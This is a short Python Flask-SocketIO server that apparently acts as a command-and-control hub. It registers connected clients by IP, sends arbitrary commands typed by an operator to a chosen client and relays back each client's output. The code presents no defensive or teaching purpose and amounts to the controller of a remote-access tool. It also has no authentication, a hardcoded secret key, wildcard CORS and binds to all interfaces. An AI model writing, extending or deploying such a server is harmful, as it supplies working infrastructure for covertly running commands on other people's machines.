import eventlet
eventlet.monkey_patch()

from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins='*')

# Dictionary to store clients {sid: {ip: ..., id: ..., output: ...}}
clients = {}

@app.route('/')
def index():
    return render_template('index.html', clients=clients)

@socketio.on('connect')
def handle_connect(auth):
    sid = request.sid
    print(f"[+] Client connected: {sid}")
    clients[sid] = {'id': sid, 'ip': 'Unknown', 'output': ''}
    emit('welcome', {'msg': f'You are connected as Unknown (awaiting IP)'})

@socketio.on('register_ip')
def handle_register_ip(data):
    sid = request.sid
    ip = data.get('ip', 'Unknown')
    clients[sid] = {'id': sid, 'ip': ip, 'output': ''}
    print(f"[+] Registered client {sid} with IP {ip}")
    emit('welcome', {'msg': f'You are connected as {ip}'})
    update_clients()

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    clients.pop(sid, None)
    print(f"[-] Client disconnected: {sid}")
    update_clients()

@socketio.on('client_output')
def handle_client_output(data):
    sid = request.sid
    output = data.get('output', '')
    ip = clients.get(sid, {}).get('ip', sid)
    print(f"[⇧] Output from {ip}:\n{output}")
    if sid in clients:
        clients[sid]['output'] = output
    socketio.emit('command_output', {'id': sid, 'ip': ip, 'output': output})

@app.route('/send/<client_id>', methods=['POST'])
def send_command(client_id):
    cmd = request.form.get('cmd')
    socketio.emit('command', {'cmd': cmd}, room=client_id)
    return f"Sent command to {client_id}. <a href='/'>Go back</a>"

def update_clients():
    socketio.emit('client_list', [{'id': sid, 'ip': info['ip']} for sid, info in clients.items()])

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=10000)
